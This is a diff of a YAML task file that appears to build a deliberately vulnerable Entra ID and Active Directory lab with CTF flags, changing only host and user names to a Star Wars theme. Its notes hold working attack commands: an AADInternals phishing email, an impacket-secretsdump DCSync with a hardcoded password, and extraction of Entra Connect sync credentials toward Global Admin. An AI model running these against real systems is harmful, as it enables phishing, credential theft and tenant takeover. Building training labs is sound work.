@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_cloud_entra/tasks/cloud_notes.yml — CLO-041..100
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # CLO-041..060: Entra ID app registration attack surfaces
 # CLO-061..080: Conditional Access bypass and token abuse
@@ -56,8 +56,8 @@
           5. Managed identity token to bypass CA
 
         Testing:
-          AADInternals: Invoke-AADIntPhishing -Recipients jim.halpert@corp.local \
-            -Subject "Password Reset" -LinkText "Reset Password" -Sender "it@corp.local"
+          AADInternals: Invoke-AADIntPhishing -Recipients luke.skywalker@empire.local \
+            -Subject "Password Reset" -LinkText "Reset Password" -Sender "it@empire.local"
 
     - path: 'C:\Flags\FLAG-CLO-071-TokenAbuse.txt'
       content: |
@@ -82,12 +82,12 @@
         Full attack chain: compromise on-prem AD → pivot to Entra ID
 
         Step 1: DCSync via MSOL_sync account (CLO-002)
-          impacket-secretsdump CORP/MSOL_sync:EntraSync2024!@10.10.0.10
+          impacket-secretsdump EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10
 
         Step 2: Crack/use Administrator NT hash for Pass-the-Hash
 
         Step 3: Extract Entra Connect DKMS key from DC (AADInternals)
-          Get-AADIntSyncCredentials -Server dc01.corp.local
+          Get-AADIntSyncCredentials -Server coruscant.empire.local
           → Returns Entra ID tenant credentials
 
         Step 4: Access Entra ID with Global Admin
